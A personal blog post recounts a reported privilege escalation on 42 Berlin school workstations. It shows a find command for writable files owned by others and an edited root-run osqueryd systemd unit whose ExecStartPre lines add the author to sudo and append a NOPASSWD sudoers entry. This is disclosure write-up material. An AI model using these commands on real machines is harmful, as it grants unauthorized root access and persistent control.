---
layout: post
title: "privilege escalation at 42 Berlin"
---
### _Climbing in Berlin_

<img src="{{ site.baseurl }}/images/pwned.webp" alt="Image" width="300" height="auto">

> I arrived to [school](https://42berlin.de/) on a sunday morning, and our Ubuntu installation was acting up. 
Firefox wouldn't start, vscode either. And so my morning started

  It was early morning, and already I had issues with our workstations. Naturally, we do not have admin privileges at school... _Unless we do_

_Hacking_ or trying to find vulnerabilities at 42 School's, its encouraged and rewarded, but my previous attempts had been fruitless when it was
_just for fun_. But this time, It was personal.
I was in a hurry to get my project done and lately the old storage system we had at that time was making the machines unresponsive at times.


> Can you hack my ex's facebook account?

We usually think of exploits as complex and niche, things only _real_ hackers know how to spot
by reading the memory of a running system in plain hexadecimal values.
But most times, a simple error on a single text file permission, is enough to spread mayhem and chaos to
a whole system.

<br>
_( In this case all the 42 Schools worldwide that used the same Ubuntu recipe)_


---

<br>

### _Getting there_


> Repeated my usual routine of checking recent kernel exploits POCs matching ours, GetTheF*ckOut Bins, suid bins...

Nothing, I just needed my bookmarts with all the links for the C project I was working on at the time, and vscode just because I still
didn't know how to use ```git mergetool``` inside neovim properly yet, and needed to solve some conflicts.

> I will find you


Suddenly I came accross a good list of find commands to search for files with specific permissions.


```bash
find / -type f ! -user $(whoami) -perm -u=w 2>/dev/null    
```
<br>

Find all the files that I'm not an owner of, and can be written into by my user.


One of the most interesting files as see it'a a .service file, so a systemd daemon. Huh! I'm familiar with services :-)
<br>

`/usr/lib/systemd/system/osqueryd.service`

When I glance into it, *Big* surprise, 

```bash
User=root
Group=root
```

<br>

[osquery service](https://www.osquery.io/) runs as ```root``` at boot and its writeable by my user...

So I proceed with the most logical step, adding my user to the sudoers file

<br>
```bash
[Service]
TimeoutStartSec=0
EnvironmentFile=/etc/default/osqueryd
ExecStartPre=/bin/sh -c "usermod -aG sudo ccattano"
ExecStartPre=/bin/sh -c "echo 'ccattano   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
```
_showing most relevant parts of the file only_

<br>
Then by the next boot, the system's sudoers file would have my user appended with the same permissions as root/bocal

```bash
root	 ALL=(ALL) ALL
bocal    ALL=(ALL) NOPASSWD: ALL
ccattano ALL=(ALL) NOPASSWD: ALL
```

<br>

---

<br>

### _Leaving as a gentleman_


> I'm in

<img src="{{ site.baseurl }}/images/imin.png" alt="Image" width="400" height="auto" />

<br>

I proceeded to fix Firefox, vscode and leaving a mark on the login background wallpaper. 

Contacted the school's staff to report the vulnerability.

> hearts for you, [stars](https://github.com/CarloCattano?tab=repositories&q=&type=public&language=&sort=) for me

<img src="{{ site.baseurl }}/images/washere.jpg" alt="Image" width="400" height="auto">

_It has been more than 1.5 years since I found it in June 2023. which has given the 42 network time enough to fix the vulnerability_


